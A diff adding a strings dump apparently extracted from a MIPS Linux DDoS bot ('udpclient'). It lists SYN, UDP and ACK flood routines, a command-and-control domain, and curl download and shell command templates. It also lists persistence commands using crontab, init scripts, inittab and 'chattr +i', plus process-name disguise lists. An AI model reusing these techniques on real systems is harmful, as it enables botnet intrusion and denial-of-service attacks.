@@ -1,0 +1,648 @@
+  %$
+  %&
+  %'
+  %<
+  *) echo 'Usage: $0 {start|stop}'; exit 1;;
+  start) %s &;;
+  stop) pkill -f %s;;
+ !"#
+ !$B
+ !$B1t
+ !&6
+ #&%
+ $$t
+ $cF
+ %$C
+ %$E
+ %$F+
+ %'9
+ %0c
+ %31[^:]: %llu %*u %*u %*u %*u %*u %*u %*u %llu
+ %8B
+ &0E
+ '9X 
+ (%'9
+ (%'9m
+ (%'9tH
+ +$B@
+ 0%$
+ 0%'9
+ 8%$
+ @$B
+ @$B8
+!,c 
+!@0c
+!F  
+"H%$
+"country"
+"query"
+# Default-Start: 2 3 4 5
+# Default-Stop: 0 1 6
+# Provides: udpclient
+# Required-Start: $network
+#!/bin/sh
+### BEGIN INIT INFO
+### END INIT INFO
+#(!,C
+$)$E.
+$B&<
+$B+\
+$B/0
+$B3\
+$B5p
+$B70
+$B9X
+$BAD
+$BB@
+$BCT
+$BEL
+$BLL
+$BTd<
+$BWN
+$Bh0
+$E+4$
+$W $
+$c/\
+$c1P
+$c1p
+$c@x'
+$cB@
+$cNm'
+%$B7H
+%&D&
+%'99
+%*c %*d %*d %*d %*d %*u %*u %*u %*u %*u %lu %lu
+%*d (%63[^)])
+%31s %lx
+%63s %d %d %d %d
+%7s %63s %d %d %d %d %d
+%d.%d.%d.%d
+%s >> /tmp/udp_shell.log 2>&1
+%x:%x:%x:%x:%x:%x:%d.%d.%d.%d
+%x:%x:%x:%x:%x:%x:%x:%x
+& !$
+&E&d
+&F&H
+&s)x$
+&si\&
+'9X 
+(!$B
+(!$c
+(!&d
+(#%)
+(%$B
+(%$F
+(%$T
+(%$Y
+(%$Y%
+(%'9
+(%'9i0
+(%'9m
+(null)
+-0X+0X 0X-0x+0x 0x
+.MIPS.abiflags
+.bss
+.comment
+.data
+.data.rel.ro
+.dynamic
+.dynstr
+.dynsym
+.eh_frame
+.eh_frame_hdr
+.fini
+.fini_array
+.gnu.attributes
+.got
+.hash
+.init
+.init_array
+.mdebug.abi32
+.pdr
+.reginfo
+.rel.dyn
+.rld_map
+.rodata
+.sdata
+.shstrtab
+.text
+/&Rs
+/@&s
+/bin/sh
+/dev/null
+/etc/hosts
+/etc/init.d/udpclient
+/etc/inittab
+/etc/profile
+/etc/rc.local
+/etc/resolv.conf
+/proc
+/proc/%d/exe
+/proc/%d/stat
+/proc/net/dev
+/proc/net/route
+/proc/stat
+/tmp/.cronudp
+/usr/bin/curl -s -o /root/$(basename %s) %s >> /tmp/udp_shell.log 2>&1
+/usr/bin/udpclient
+/var/tmp/.sysbak
+0!&DQ
+0#$B
+0$B*
+0%$D
+0%$c
+0%&1x
+0%'9
+0&s&('
+0+&e
+00D?
+0123456789ABCDEF
+127.0.0.1
+2H%'
+3M$D
+3h'9
+3x'9
+48<@
+5*&DQ
+8!$B
+8!$c
+8!<	
+8%&R
+8.8.8.8
+9t-+   0X0x
+:$c5 
+@ %$
+@ %$H
+@ %'
+@ %'9
+@ %'9M`
+@ %(B
+@ %,
+@ %<
+@ %|
+@$B%p
+@$c 
+@%$c
+@%%(
+@&s*(
+@(%$
+@(%'
+@(%'9
+@(%'9y0
+@(%(B
+@(%<
+@0%$
+@0%'
+@0%2$
+@0%2R
+@8%$
+@8%&
+@8%(
+@H%$
+@T <
+@reboot %s >/dev/null 2>&1
+A @lA l
+AB($
+Address family not supported by protocol
+Address in use
+Address not available
+Argument list too long
+BQd$d
+Bad address
+Bad file descriptor
+Bad message
+Block device required
+Broken pipe
+C0!,e
+Cannot send after socket shutdown
+Connection aborted
+Connection refused
+Connection reset by network
+Connection reset by peer
+Connection: close
+Cross-device link
+D !$c
+D #F6
+D $<
+D'9m
+D(&f
+D/$D
+DOWNLOAD|
+DV	D
+DV]D
+Destination address required
+Device not a stream
+Device timeout
+Directory not empty
+Domain error
+E/ F
+Exec format error
+F `2
+File descriptor in bad state
+File exists
+File too large
+Filename too long
+Function not implemented
+G8$$
+GET /json HTTP/1.0
+H!%%
+HELLO|%s|%s|%s|%d|%d
+Host is down
+Host is unreachable
+Host: ip-api.com
+I/O error
+Identifier removed
+Illegal byte sequence
+Interrupted system call
+Invalid argument
+Invalid seek
+Is a directory
+KILLER 
+Killer %s
+LINUX_2.6
+Link has been severed
+METRICS|CPU:%.2f%%|BW:%.2fMB/s
+Message too large
+Multihop attempted
+Network is down
+Network unreachable
+NetworkManager
+No buffer space available
+No child process
+No data available
+No error information
+No file descriptors available
+No locks available
+No medium found
+No message of desired type
+No space left on device
+No such device
+No such device or address
+No such file or directory
+No such process
+Not a directory
+Not a socket
+Not a tty
+Not supported
+O8GCC: (GNU) 11.2.1 20211120
+Operation already in progress
+Operation canceled
+Operation in progress
+Operation not permitted
+Operation timed out
+Out of memory
+Out of streams resources
+P !0
+Permission denied
+Previous owner died
+Protocol error
+Protocol family not supported
+Protocol not available
+Protocol not supported
+Protocol wrong type for socket
+Q &$
+Quota exceeded
+R0#&
+R0$4
+Read-only file system
+Remote I/O error
+Resource busy
+Resource deadlock would occur
+Resource temporarily unavailable
+Result not representable
+S(&'
+SHELL|
+ST$BOP
+STOP
+Socket is connected
+Socket not connected
+Socket type not supported
+Stale file handle
+State not recoverable
+Symbolic link loop
+T $B
+T$B,
+Text file busy
+Too many links
+Too many open files in system
+U@!&
+UDP socket error
+Value too large for data type
+WATCHDOG_RESTART
+Wrong medium type
+Xorg
+_DYNAMIC_LINKING
+_Exit
+_Fork
+__RLD_MAP
+__clock_gettime64
+__environ
+__fstatat_time64
+__h_errno_location
+__libc_start_main
+__nanosleep_time64
+__progname
+__progname_full
+__stat_time64
+__strerror_l
+__time64
+__uflow
+__vdso_clock_gettime
+_exit
+_fini
+_pthread_cleanup_pop
+_pthread_cleanup_push
+` %$
+` %$B
+` %4E 
+` %<
+`(%$Y
+`(%&
+`(%'9
+`(%8B
+`(%<
+`0%$
+`0%'9
+`8%$
+`@%'
+`h%$
+aB0(C
+access
+ack_attack_process
+ack_thread_func
+acpid
+active_processes
+agetty
+apache2
+asb.buchudui.asia
+atoi
+attack_count
+attack_mutex
+attack_pids
+attempts:
+avahi-daemon
+b(!$B
+b(#$
+bash
+bdi-default
+bind
+calloc
+case "$1" in
+chattr +i %s 2>/dev/null
+chattr +i /etc/init.d/udpclient 2>/dev/null
+chattr +i /etc/inittab 2>/dev/null
+chattr +i /etc/profile 2>/dev/null
+chattr +i /etc/rc.local 2>/dev/null
+chdir
+chmod
+chmod +x %s
+closedir
+collectd
+connect
+containerd
+copysign
+copysignl
+cp -f %s %s
+cpu %llu %llu %llu %llu %llu %llu %llu %llu
+cron
+crontab -l 2>/dev/null > /tmp/.cronudp
+crontab /tmp/.cronudp && rm -f /tmp/.cronudp
+crypto
+csum
+daemonize
+dbus-daemon
+dhclient
+disabled
+docker
+dockerd
+domain
+e$__vdso_clock_gettime64
+enabled
+ensure_self_copy
+esac
+execv
+execve
+ext4-dio-unwrit
+f0#$
+fabs
+fabsl
+fclose
+fcntl
+fdopen
+fetch_public_info
+fflush
+fgets
+file_watchdog
+filter
+fmod
+fmodl
+fopen
+fork
+free
+frexp
+frexpl
+fsnotify_mark
+fwrite
+g(!F"
+g_ctrl_sock
+get_default_iface
+get_local_ip
+get_random_process_name
+getc
+getcwd
+getenv
+geteuid
+gethostbyname
+gethostbyname2
+gethostbyname2_r
+getpid
+getppid
+getrlimit
+getsockname
+global_argv
+gnome-shell
+h$B&h
+h_errno
+handle_commands
+haproxy
+hide_argv
+htons
+if_nametoindex
+inet_addr
+inet_ntop
+inet_pton
+init
+install_persistence
+ioctl
+ip-api.com
+irqbalance
+isalnum
+java
+jbd2/sda1-8
+kblockd
+kdevtmpfs
+keepalived
+khelper
+khungtaskd
+kill
+killer
+killer_enabled
+ksoftirqd/0
+kswapd0
+kthrotld
+kworker
+kworker/0:0
+kworker/u:2
+l&R&
+l0CA
+lA$l
+lightdm
+lm_sensors
+malloc
+mbrtowc
+mbsinit
+mbsrtowcs
+mbstowcs
+memcached
+memchr
+memcmp
+memcpy
+memmove
+memset
+migration/0
+mprotect
+munmap
+mysql
+nameserver
+ndots:
+netns
+nginx
+node_exporter
+nrpe
+obfuscate_process
+opendir
+options
+perl
+php-fpm
+pid_mutex
+pipe
+pipe2
+polkitd
+poll
+posix_spawn
+posix_spawnattr_destroy
+posix_spawnattr_init
+posix_spawnattr_setflags
+posix_spawnattr_setsigdefault
+posix_spawnattr_setsigmask
+postgres
+prctl
+prometheus
+pthread_create
+pthread_detach
+pthread_join
+pthread_mutex_lock
+pthread_mutex_unlock
+pthread_rwlock_rdlock
+pthread_rwlock_tryrdlock
+pthread_rwlock_trywrlock
+pthread_rwlock_unlock
+pthread_rwlock_wrlock
+pthread_self
+pthread_setcancelstate
+pthread_sigmask
+pthread_testcancel
+pulseaudio
+python
+qsort
+rcu_bh
+rcu_sched
+read
+read_cpu_stat
+read_net_stat
+read_proc_jiff
+read_total_jiff
+readdir
+readlink
+realloc
+realpath
+recv
+recvfrom
+redis-server
+report_stats
+rsyslogd
+ruby
+scalbn
+scalbnl
+scsi_eh_0
+search
+send
+send_mutex
+sendto
+setsid
+setsockopt
+sigaction
+sigaddset
+sigemptyset
+sigismember
+signal
+sigprocmask
+smartd
+socket
+srand
+sshd
+stderr
+stdout
+stop_all_attacks
+stop_attack
+strcasecmp
+strchr
+strcmp
+strcpy
+strcspn
+strdup
+strerror
+strlen
+strncmp
+strncpy
+strnlen
+strrchr
+strspn
+strstr
+strtoll
+strtoul
+strtoull
+syn_attack_process
+syn_thread_func
+sync_supers
+sysconf
+system
+systemd
+systemd-logind
+systemd-udevd
+t !(
+telegraf
+timeout:
+tolower
+ud$Bp
+udp_attack_process
+udp_thread_func
+umask
+uname
+unsetenv
+update-rc.d udpclient defaults >/dev/null 2>&1 || chkconfig --add udpclient
+upstart
+usleep
+v/,'
+varnishd
+vfprintf
+vfscanf
+vsnprintf
+vsscanf
+waitpid
+watchdog/0
+wcrtomb
+wctomb
+wpa_supplicant
+zabbix_agentd
+zombie:2345:respawn:udpclient
